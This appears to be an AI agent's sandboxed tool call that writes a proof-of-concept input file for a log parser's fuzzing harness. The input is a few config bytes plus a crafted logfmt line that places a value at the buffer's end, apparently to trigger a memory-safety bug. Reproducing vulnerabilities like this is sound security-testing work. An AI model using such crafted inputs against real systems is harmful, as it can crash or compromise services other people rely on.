message:
Running command: cd /workspace && python3 -c "
# Config bytes
b0 = 3   # logfmt (3 % 4 == 3)
b1 = 0   # no time_fmt
b2 = 0   # no time_key
b3 = 0   # no time_offset
b4 = 0   # no time_keep
b5 = 1   # types set (includes BOOL for key CCC)
b6 = 0   # no decoders
config = bytes([b0,b1,b2,b3,b4,b5,b6])
# log line: AAA=<90 A's> CCC=x  (value x at end of buffer)
logline = b'AAA=' + b'A'*90 + b' CCC=x'
poc = config + logline
print('total len', len(poc))
open('/workspace/poc.bin','wb').write(poc)
print(repr(poc))
"
